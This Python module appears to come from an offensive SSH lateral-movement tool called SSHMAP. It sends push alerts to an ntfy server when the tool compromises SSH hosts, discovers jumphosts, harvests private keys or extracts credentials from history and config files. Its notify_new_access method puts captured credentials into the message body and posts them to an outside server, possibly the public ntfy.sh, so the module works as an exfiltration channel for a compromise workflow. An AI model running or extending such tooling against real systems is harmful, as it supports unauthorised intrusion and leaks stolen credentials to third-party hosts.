"""
SSHMAP ntfy Notifier
====================
Sends fire-and-forget push notifications to an ntfy server
(https://ntfy.sh or any self-hosted instance) when interesting
events occur during a scan:

  🔑  New SSH host compromised
  🌐  New jumphost discovered (recursive depth)
  ✅  Scan finished summary
  🗝️  SSH private key harvested (credential_harvester module)
  📋  Credentials extracted from history/config files

Usage – config.yml
------------------
ntfy_url:    "https://ntfy.sh"        # or http://localhost:8080
ntfy_topic:  "sshmap-alerts"
ntfy_token:  ""                       # Bearer token for protected topics

Usage – CLI (overrides config)
-------------------------------
  --ntfy-url    https://ntfy.sh
  --ntfy-topic  sshmap-alerts
  --ntfy-token  mytoken

All network calls are non-blocking (background thread) so they never
slow down the scan.
"""

from __future__ import annotations

import threading
import urllib.request
import urllib.error
import urllib.parse
import time
from typing import Optional, List
from .logger import sshmap_logger


class NtfyNotifier:
    """Thin wrapper around the ntfy HTTP push API."""

    # ntfy priority levels
    PRIORITY_MIN     = "min"
    PRIORITY_LOW     = "low"
    PRIORITY_DEFAULT = "default"
    PRIORITY_HIGH    = "high"
    PRIORITY_MAX     = "urgent"

    # Simple in-process dedup: track (title, message) hashes sent in the
    # last DEDUP_WINDOW seconds so we don't flood the topic when the same
    # host is found through multiple paths in rapid succession.
    DEDUP_WINDOW = 30  # seconds

    def __init__(
        self,
        url: str = "",
        topic: str = "",
        token: str = "",
        enabled: bool = False,
        timeout: int = 8,
    ) -> None:
        self.url     = (url or "").rstrip("/")
        self.topic   = (topic or "").strip()
        self.token   = (token or "").strip()
        self.enabled = enabled and bool(self.url) and bool(self.topic)
        self.timeout = timeout

        self._lock       = threading.Lock()
        self._dedup: dict[int, float] = {}   # hash → sent_at timestamp

    # ------------------------------------------------------------------
    # Public helpers
    # ------------------------------------------------------------------

    def configure(self, url: str, topic: str, token: str = "") -> None:
        """Update settings at runtime (e.g. after CLI arg parsing)."""
        self.url     = (url or "").rstrip("/")
        self.topic   = (topic or "").strip()
        self.token   = (token or "").strip()
        self.enabled = bool(self.url) and bool(self.topic)
        if self.enabled:
            sshmap_logger.display(
                f"[notifier] ntfy enabled → {self.url}/{self.topic}"
            )

    # ---- event helpers ------------------------------------------------

    def notify_new_access(
        self,
        source_host: str,
        remote_host: str,
        user: str,
        method: str,
        creds: str,
        ip: str,
        port: int,
    ) -> None:
        """New SSH host successfully compromised."""
        self._send_async(
            title    = f"🔑 New SSH access: {remote_host}",
            message  = (
                f"From : {source_host}\n"
                f"To   : {remote_host}  ({ip}:{port})\n"
                f"User : {user}\n"
                f"Method: {method}\n"
                f"Creds: {creds}"
            ),
            priority = self.PRIORITY_HIGH,
            tags     = ["key", "rotating_light"],
        )

    def notify_new_jumphost(
        self,
        host: str,
        depth: int,
        source_host: str,
    ) -> None:
        """New recursive jumphost discovered."""
        self._send_async(
            title    = f"🌐 New jumphost: {host}",
            message  = (
                f"Jumphost : {host}\n"
                f"Found at depth {depth} from {source_host}"
            ),
            priority = self.PRIORITY_DEFAULT,
            tags     = ["globe_with_meridians"],
        )

    def notify_scan_complete(
        self,
        targets_count: int,
        hosts_found: int,
        depth: int,
    ) -> None:
        """Emitted when the full scan finishes."""
        self._send_async(
            title    = "✅ SSHMAP scan complete",
            message  = (
                f"Targets scanned : {targets_count}\n"
                f"Hosts compromised: {hosts_found}\n"
                f"Max depth reached: {depth}"
            ),
            priority = self.PRIORITY_DEFAULT,
            tags     = ["white_check_mark"],
        )

    def notify_private_key_found(
        self,
        hostname: str,
        key_path: str,
        key_type: str,
        encrypted: bool,
    ) -> None:
        """SSH private key harvested by credential_harvester."""
        enc_label = "encrypted" if encrypted else "⚠️ plaintext"
        self._send_async(
            title    = f"🗝️ Private key on {hostname}",
            message  = (
                f"Host  : {hostname}\n"
                f"Path  : {key_path}\n"
                f"Type  : {key_type}  ({enc_label})"
            ),
            priority = self.PRIORITY_HIGH if not encrypted else self.PRIORITY_DEFAULT,
            tags     = ["old_key", "rotating_light"] if not encrypted else ["old_key"],
        )

    def notify_credentials_extracted(
        self,
        hostname: str,
        creds_count: int,
        types_found: List[str],
    ) -> None:
        """Credentials extracted from history / config files."""
        types_str = ", ".join(sorted(set(types_found))) if types_found else "unknown"
        self._send_async(
            title    = f"📋 Credentials on {hostname}",
            message  = (
                f"Host  : {hostname}\n"
                f"Count : {creds_count}\n"
                f"Types : {types_str}"
            ),
            priority = self.PRIORITY_HIGH,
            tags     = ["clipboard", "rotating_light"],
        )

    # ------------------------------------------------------------------
    # Core send logic
    # ------------------------------------------------------------------

    def _send_async(
        self,
        title: str,
        message: str,
        priority: str = PRIORITY_DEFAULT,
        tags: Optional[List[str]] = None,
    ) -> None:
        """Submit the notification to a background thread (non-blocking)."""
        if not self.enabled:
            return

        # Dedup check
        key = hash((title, message))
        now = time.monotonic()
        with self._lock:
            last = self._dedup.get(key, 0.0)
            if now - last < self.DEDUP_WINDOW:
                sshmap_logger.debug(
                    f"[notifier] Skipping duplicate notification: {title!r}"
                )
                return
            self._dedup[key] = now
            # Prune old entries to avoid unbounded growth
            self._dedup = {
                k: v for k, v in self._dedup.items()
                if now - v < self.DEDUP_WINDOW * 10
            }

        t = threading.Thread(
            target  = self._send_sync,
            args    = (title, message, priority, tags or []),
            daemon  = True,
            name    = "ntfy-notify",
        )
        t.start()

    def _send_sync(
        self,
        title: str,
        message: str,
        priority: str,
        tags: List[str],
    ) -> None:
        """Blocking HTTP POST — runs inside background thread."""
        url = f"{self.url}/{urllib.parse.quote(self.topic, safe='')}"
        payload = message.encode("utf-8")

        headers: dict[str, str] = {
            "Content-Type":  "text/plain; charset=utf-8",
            "Title":         title,
            "Priority":      priority,
        }
        if tags:
            headers["Tags"] = ",".join(tags)
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                status = resp.status
                if status not in (200, 201, 204):
                    sshmap_logger.debug(
                        f"[notifier] ntfy returned HTTP {status} for {title!r}"
                    )
                else:
                    sshmap_logger.debug(
                        f"[notifier] Notification sent: {title!r}"
                    )
        except urllib.error.URLError as e:
            sshmap_logger.debug(f"[notifier] Failed to send notification: {e}")
        except Exception as e:
            sshmap_logger.debug(f"[notifier] Unexpected error: {e}")


# ---------------------------------------------------------------------------
# Global singleton – imported by SSHMAP.py and credential_harvester
# ---------------------------------------------------------------------------
notifier = NtfyNotifier()
